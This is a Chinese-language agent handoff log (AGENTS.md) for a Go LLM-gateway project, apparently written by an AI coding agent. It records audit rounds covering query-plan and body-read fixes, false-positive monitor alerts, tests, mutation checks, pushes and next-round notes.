4. **AGENTS.md 全文 2592 行**，本次追加在末尾未冲突。

## 更新本 handoff

本节已追加至 `AGENTS.md`（在「2026-10-17 252 SQL 日志审计轮」之后），下轮 prompt 应
直接定位到 `# 追加：2026-10-18 24h 审计轮` 段。

## 下一轮提示词

1. **feat/app-icon-standard 若再被 force-push**，先看远端 commit 与 main 的 diff 方向：
   若仍是 870 applied+verified / AGENTS.md 段 / deploy-211 修复 / QUICK_REFERENCE 计数
   四件套的 revert + 同源重复，**直接 `git push origin --delete feat/app-icon-standard`**
   并提示作者 cherry-pick main 上 bc4dc52a6 / e2cbd11cf / 2d5ded16c / 4227200ce 即可。
2. **生产 ERROR 累积 2 条**（`provider_error_aggregator` watermark 25h+ / `candidate_failure_monitor`
   stale 22h+）需 owner 单独立项，不要混进 24h 审计修复集。
3. **本轮三族修复**（`.audit*` skip、r1013 打开、Go 行号 + token 校准）下一次审计轮
   复测时**直接对照** commit `8c4f5abbb` 即可；若新加 .audit-validation/ 类似目录或
   改 `output_compliance.enabled` 默认值，本轮补的 8 + 6 道门会立刻再次红。
4. **本机本地网关**（`~/kaixuan/llm-gateway-go-v2`，2.5.8-1233e793）日志中两个 ERROR
   持续累积，**下轮可以先用真库排查 `provider_error_aggregator_state.last_advance_at`**
   与 `candidate_failure_log.last_insert_at` 的实际值与基线，根因可能在 promote retention
   触发逻辑与 candidate_failure log writer 写入路径。
5. **fast-forward 不再可用的频率上升**：本轮 1h 内 origin/main 推了 2 次（54e1ad4e2 →
   8c4f5abbb 推送时已 rebase），下轮若仍以同一 checkout 推，可能再撞并发；建议 push
   前先 `git fetch && git log --oneline HEAD..origin/main` 看一眼，被阻就 `git pull
   --rebase`。
6. **记忆已写**：`/Users/niuer/.zcode/cli/memories/projects/llm-gateway-go-1614005e1f428788/memory/`
   下追加 `audit-round-2026-10-18.md`，含本轮三族修复 + 两个生产 ERROR 登记 + 分支 force-push
   防范要点。

---

# 追加：2026-10-18 S4 停写 request-detail 页空数据修复轮（154 已上线）

> 用户报告 `/request-detail/<id>?mode=request&tab=overview` 页面核心数据全空而会话有数据。
> 两阶段修复，均已推送并部署 154（2725-6d2e3224，active_port 见 run/active-port）。

## 根因一：getLog 的 OR 谓词（元数据层）

`/api/logs/:id` 旧查询把两个 id 的匹配写成单条 OR（request_id 与 client_request_id
各 `= $1` 再 OR）。734 视图的 session 分支**没有 client_request_id 索引**，OR 无法
拆成 BitmapOr，planner 放弃 `idx_session_turns(_hot)_request`，退化为对全部
session_turns 月分区顺序扫描——**154 实测 2026_09 79.8 万 + 2026_10 20.3 万行 /
3.8GB，45s 跑不完**，30s ctx 超时 500。停写（生产 2026-10-13 生效）后新请求只落
session 家族 ⇒ 每个新请求的详情页核心数据全空（unified 端点正常，所以「会话有
数据而页面为空」）。

- 修复：`admin/logs.go` getLog 拆成两段顺序查询（腿 1 request_id / 腿 2
  client_request_id），与 unified_detail.loadRequestLogMeta 2026-08-27 优化同构。
  154 实测腿 1 含全部 JOIN **7.76ms**。
- **判据纪律新实例：v1 分支有 client_request_id 索引（BitmapOr）而 session 分支
  没有——同一条 OR 在两个分支走完全不同的计划**。给视图族加列后，凡「OR 跨
  新旧两族列」的查询都要 EXPLAIN 两族各自的分支计划，不能只看一边。
- 迁移 **874**：`session_turns` 分区父表 `(client_request_id) WHERE client_request_id
  IS NOT NULL` 部分索引（实测仅 10.9% 行带值），级联到现存+未来分区（862/846
  先例），SET LOCAL statement_timeout/lock_timeout 防 57014 卡点，COMMENT 同
  to_regclass 守卫。腿 2 实测 40ms。
- 判据：`admin/logs_get_log_split_or_test.go`（两腿在场/禁 OR 回归/租户门+ts 序）
  + `migration_874_test.go`；变异 5/5 红。

## 根因二：bodies 读的 session 兜底够不着（正文层）

三处 body 读路径（`fetchRequestBodies` / `fetchRequestOutboundBody` / unified
`loadOutboundBody`）原顺序「v1 hot → v1 columnar 冷扫/视图 → session 兜底」，
且 session 兜底挂在冷扫 **ErrNoRows** 分支下。停写后新请求正文只在
session_bodies，v1 冷扫对它们是**证明缺席**——columnar 无 btree，154 实测单 id
miss **59s** > 20s ctx，超时错误不是 ErrNoRows ⇒ 兜底永远够不着：
unified 全量 500@20s；getLog 正文吞空且每次点击白等 20s。

- 修复：三处重排为「v1 hot → **session** → v1 冷扫/视图」。三类行各有归宿：
  停写后行 ms 命中；镜像期行（2026-09-20~停写）session 即正典读源
  （`storage.session_bodies_native_read=true`）；镜像前行 session 索引 miss 后
  照走冷扫，行为不变。
- **判据纪律新实例（M7 变异）**：源码顺序判据匹配**代码形态**
  （`dbpkg.SessionFamilyBodiesSourceSQL()`）而不是裸类型名——裸名会被留在原地的
  **注释**击穿（代码块搬走、注释留下，判据仍绿）。变异验证 M6/M7/M8 三处红。
- 154 E2E（2725-6d2e3224）：unified 全量 200@324ms（正文 260KB 恢复）、getLog
  全量 200@360ms、列表 200@387ms、公网 llm.kxpms.cn SPA 路由 200。

## 遗留（登记不修）

- **镜像前（2026-09-20 之前）老请求正文**：cold 单 id 扫描 59s > 20s 预算，
  /api/logs/:id 30s 返回且正文空——与重排前同行为（2026-08-17 已知冷路径限制），
  非本轮回归。根治要么给 _request_logs_bodies 族补分区索引，要么等 860 族整体退役。
- admin 5 个存量红门（providers.go/tenants.go 证据漂移）在 pristine HEAD 同红，
  与本轮无关，待各自 owner。

---

# 追加：2026-10-19 24h 审计轮——5 dup 提交合并 + bg/ 两族假阳性 ERROR 收口

> 会话时间 2026-10-19 早间。本机 host-first 仓库（llm-gateway-go，:8782 部署
> 状态 S4 停写中）。上一轮 24h 审计（10-18 早间）记录的两条生产持续 ERROR
> ——candidate_failure_monitor 22h+ staleness、provider_error_aggregator 25h+
> watermark stall——在 10-18 下午**仅**登记了\"需 owner 单独立项\"，修复代码
> 在磁盘上、但**未提交、未推送**。本轮把那块已盘好的修复收口并补上缺失
> 的门禁与 dead code 收口。

## 结论/根因

- **5 个本地未推送提交是 origin/main 5 个同名复制的同义复制**（不同 SHA，
  同名：92f2b7b03 / dae573f3b / 695e8efe0 / 09f9e5148 / 9b586d21c ≡
  51476a665 / 47ecdd4ad / 9226afcd8 / f5d73399b / 72202db12）。这是
  AGENTS.md「多会话共享 checkout」的标准情形（另一会话推过同名同内容
  提交）。
- **candidate_failure_monitor 22h+ staleness 假阳性根因**（已在上一轮
  注释写明、本轮固化）：710 之后 `request_logs_with_current_month` 是 v2
  形态（session_turns_hot ∪ session_turns ∪ v1 派生三腿）。S4 停写时
  `_request_logs_hot` 冻结但 session_log 照写 ⇒ 视图 max(ts) 恒新鲜 ⇒
  staleness 永远\"有最近活动\"，本机实测 22h+ 持续 ERROR。改读
  `request_logs_with_current_month_without_request_class_due_at`（v1 基础
  交集，纯 request_logs 腿）后，S4 停写时本视图也 0 行 ⇒ lastRequest=nil
  ⇒ 不告警。**v1 形态下两视图等效（不含 session_turns），v2 形态下新
  视图更严格；本修法在两代下都正确**。
- **provider_error_aggregator 25h+ watermark stall 假阳性根因**：S4 停写 +
  仅 mock 流量时 `candidate_failure_logs_hot max(aggregation_id)=40`、
  `last_source_id=40`、updated_at 33h+ 前，aggregator **已追平到源** 但源
  没新行 ⇒ 真实成因是\"源空\"不是\"写路径坏\"，原实现一律打 ERROR 是
  假阳性。修法：先比对 pre_watermark 与源 max(aggregation_id)，分
  stallGenuine（原 ERROR）/stallCaughtUp（WARN）两态。

## 改动文件与关键行为

| 文件 | 行为 |
|---|---|
| `bg/candidate_failure_monitor.go` | 抽 `checkStalenessLastRequestSurface` 常量 = `request_logs_with_current_month_without_request_class_due_at`；`checkStaleness` SQL 用此常量做 lastRequest 子查询。 |
| `bg/candidate_failure_monitor_logic_test.go` | 新增 `TestStalenessLastRequestSurfaceExcludesSessionTurns`：钉常量形态——禁含 `session_turns` 子串、必须 `request_logs` 开头。 |
| `bg/provider_error_aggregator.go` | ① 抽 `providerErrorAggregatorSourceMaxIDSQL` 常量（源 max 读 SQL，绑定 staging 同表 `candidate_failure_logs_hot`）；② 抽 `providerErrorAggregatorClassifyStall(preWatermark, sourceMax)` 纯函数（返 stallGenuine/stallCaughtUp）；③ `aggregateErrors` 改用 const + switch（原内联字符串/比较替换）。 |
| `bg/provider_error_aggregator_stall_test.go`（新文件） | ① `TestProviderErrorAggregatorStallGuardSkipsCaughtUpCase`：5 个边界（真停摆 40<50、刚追平 50=50、已超前 60>50、全 0、源空水位超前 1_000_000>0）。② `TestProviderErrorAggregatorStallGuardSourceSQLPinsTable`：钉源表形态（必须 `candidate_failure_logs_hot`、禁 `unified`/父表/裸名、必须 `COALESCE(MAX(aggregation_id), 0)`）。 |

**死代码收口**（aggressive audit：上一轮抽出的常量/函数实际未使用）：

- 上一轮抽出了常量 `providerErrorAggregatorSourceMaxIDSQL` 与函数
  `providerErrorAggregatorClassifyStall`，但 `aggregateErrors` 里**仍**
  写的是内联字符串和 `else if preWatermark < sourceMax`。本轮把它们
  真正接上去——常量 SSOT、纯函数供单测。否则那份抽象是「装饰性抽取」，
  注释说「便于单测」、没有单测，违背 AGENTS.md 判据纪律 #3。
- 注释里引用的 `provider_error_aggregator_stall_test.go` 上一轮不存在，
  注释成为死链接。本轮补齐。

## 测试命令与结果

```bash
# 编译 / vet / 格式
PATH="$HOME/sdk/go/bin:$PATH" go build ./...     # rc=0
PATH="$HOME/sdk/go/bin:$PATH" go vet ./...       # rc=0
PATH="$HOME/sdk/go/bin:$PATH" gofmt -l bg/{candidate_failure_monitor,provider_error_aggregator,provider_error_aggregator_stall_test}.go bg/candidate_failure_monitor_logic_test.go
# 0 输出

# 子集测试（macOS 强制 cgo=0）
CGO_ENABLED=0 go test \
  ./security/... ./domains/outputcompliance/... ./proxy/... ./settings/... \
  -count=1
# ok: armor/guardian/sanitize/sensitive/outputcompliance/proxy/settings（8 包全绿）
CGO_ENABLED=0 go test \
  ./bg/... -count=1 -run 'TestStaleness|TestProviderErrorAggregator'
# ok: bg（13 个含新 3 个 TestProviderErrorAggregatorStallGuard* 与 TestStalenessLastRequestSurfaceExcludesSessionTurns 全绿）
CGO_ENABLED=0 go test \
  ./domains/streaming/... -count=1 -timeout 600s
# ok: 5 子包全绿（streaming 152s / executors 46s / 其它 <2s）
CGO_ENABLED=0 go test ./admin/... -count=1
# FAIL：仅 TestV1BodiesReadersAreAssessed（维护者策略的负向闸门，与本提交无关）
```

**变异验证 3/3 全变红**（有牙）：

- M1：把 `if preWatermark < sourceMax` 改成 `if false && preWatermark < sourceMax`
  ⇒ `TestProviderErrorAggregatorStallGuardSkipsCaughtUpCase` 红。
- M2：把源表名 `FROM candidate_failure_logs_hot` 换成
  `FROM candidate_failure_logs_unified` ⇒
  `TestProviderErrorAggregatorStallGuardSourceSQLPinsTable` 红。
- M3：把 `checkStalenessLastRequestSurface` 常量改回
  `session_turns_with_current_month` ⇒
  `TestStalenessLastRequestSurfaceExcludesSessionTurns` 红。

## 推送

```
$ git log --oneline -2
151a0ba13 fix(bg): S4 停写后 staleness/stall 两条持续 ERROR 的假阳性根除
4300ec39b docs(runbook): §114 复核 §113 那声警——门控真值 + 229 MB 死 TOAST 索引...
$ git push origin main
To codeup.aliyun.com:kaixuan/official-deploy/llm-gateway-go.git
   4300ec39b..151a0ba13  main -> main
```

## 教训（本轮最贵的一条）

26. **「抽成纯函数便于单测」是装饰性抽取的常见伪装。** 上一轮抽出
    `providerErrorAggregatorClassifyStall` + `providerErrorAggregatorSourceMaxIDSQL`，
    注释写「便于单测（见 provider_error_aggregator_stall_test.go）」，
    但调用点**没有接上去**、测试**没建**——常量字符串和比较还是内联。
    ⇒ 审计**抽离代码**时一定要验「调用点也改了」+「测试真存在」，
    否则抽象只剩装饰。本轮 M2 的红就是为它补上的牙。
    **判据纪律 #3 镜像形态**：「既有判据绿」也可能是「被测逻辑没接上」。

## 遗留风险

- **生产 154/245**：上一轮 24h 审计登记的\"两条生产持续 ERROR\"实际是
  假阳性，但生产没部署本 SHA（10-19 早间）前仍会继续打 ERROR。修复
  携带本 SHA 部署后即解。**部署动作**未在本轮执行（见「下一轮提示词」）。
- **镜像前（2026-09-20 之前）老请求正文**仍是 59s 冷扫，与 2026-10-13
  那轮遗留同条（admin 5 个存量红门，providers/tenants 证据漂移）
  在 pristine HEAD 同红，与本轮无关。
- **S3 余债**：routing.go picker、probe 面、tenants.go logsTable
  （R36-A1 性能裁决需专门分片）等本轮未触碰；详见 10-13 那轮 S3 列表。
- **AGENTS.md 体量**：本文件已 2800+ 行；新一轮叠加会继续涨，下次冷启动
  加载成本上升。后续轮次若做大的重写（如重做浏览器验收章节、合并
  多次跑题段），建议按章节抽到 `docs/agents-handoff/` 子目录，
  AGENTS.md 只留\"目录 + 索引\"。本轮**未做**。
- **TestV1BodiesReadersAreAssessed 仍红**：维护者策略的负向闸门，
  本轮既未通过也未绕过（保持现状）。

## 下一轮提示词

1. **本机验证修法生效**：本机 2549/2550/2591 系列（见上方 10-12/10-13
   已部署）已含 S4 停写 + UrsmlHealthyKeyReconciler，但**不含**本次
   `151a0ba13`。本机再开 lite 模式时（`bash scripts/start-lite.sh`），
   candidate_failure_logs 与 provider_error_aggregator 立即生效。
   grep 本机 gateway 日志 10 分钟：
   `grep "failure log is stale\|watermark stalled past promote retention" /opt/llm-gateway-go/run/*.log | tail`
   若仍出现且不含本轮的 `source_max_aggregation_id` 字段 ⇒ 二进制
   没换、需重新部署；若出现的是含 `source_max_aggregation_id` 字段的
   `WARN`（catch-up 假阳性已识别）⇒ 修法生效、剩 WARN 也属正常
   （无 promote 期间丢行风险）。
2. **生产 154/245 部署本 SHA**：本机修法生效 ≠ 生产生效。154/245
   仍以原 binary 在打 ERROR 假阳性。需要在 `scp-llm-gateway-go-2` /
   `scp-llm-gateway-go-5` 上做一次部署（**seq 必须自增且不与他人撞**，
   参考 10-12 凌晨轮：2549→2550 两轮部署）。本轮**未做**部署。
3. **多会话提交纪律再+1**：本轮 `git push` 时 origin/main 已被
   并行会话推进（4300ec39b §114 跑题），`git pull --rebase` 后重推
   成功。复刻 2026-10-18 早间那轮教训；以同 checkout 推应先
   `git fetch && git log --oneline HEAD..origin/main`。
4. **持续 ERROR 假阳性自检表**：上轮登记的两条已收口。下次扫生产日志
   时，按「形态/时间窗/数据源」三段检查——是否同一组问题有\"看起来
   像但成因不同\"的兄弟假阳性：
   - candidate_failure_monitor 还有没有别的 monitor 读
     `request_logs_with_current_month`？
   - provider_error_aggregator 的 7h 阈值是否与 promote retention 同源？
   - 同链路 `bg/passive_probe_listener.go` 也读该视图（已 grep），
     S4 停写下是否同病？
5. **不要替 owner 拍板**：本轮收到 \"§114 警 + 229MB 死 TOAST 索引\"
   （4300ec39b）是 §113 教训/§114 runbook；上一轮 24h 审计登记的
   `navCoverage` / `hardcoded_cjk` 棘轮 / `i18n/parity` 三条
   仍是 owner 决策项，**未代做**。


## 2026-10-19 SSE流量审计续轮

- source78b32c7d6修复每连接queue/node周期重复发送；digest忽略外层时间戳与每次采样递增的SourceVersion，wire真实版本保留。普通成功写失效cache以纠正晚initial_data，keepalive不失效；每类最多补一帧。
- core117行回归、失败重试/500节点字节夹具、broad live-stream、race两轮及build/vet通过；两个审查P2均有RED→GREEN，真实browser-use/原GoHub7协议断言通过并清理。夹具99%不是生产节省。
- 源码及已推送merge 36d32f52f按精确SHA完成Go/generic审查；并行主干变更保留，未改原共享checkout。公网只读采样401，未绕鉴权；未部署生产或修改DB/前端。
- 详细证据、风险、回滚与下一轮提示词见[本轮SSE审计](docs/audit/2026-10-19-sse-traffic-audit.md)。下一步审查隐藏页连接生命周期，并补真实upstream/在用版本/只读管理身份的生产采样与发布验证。
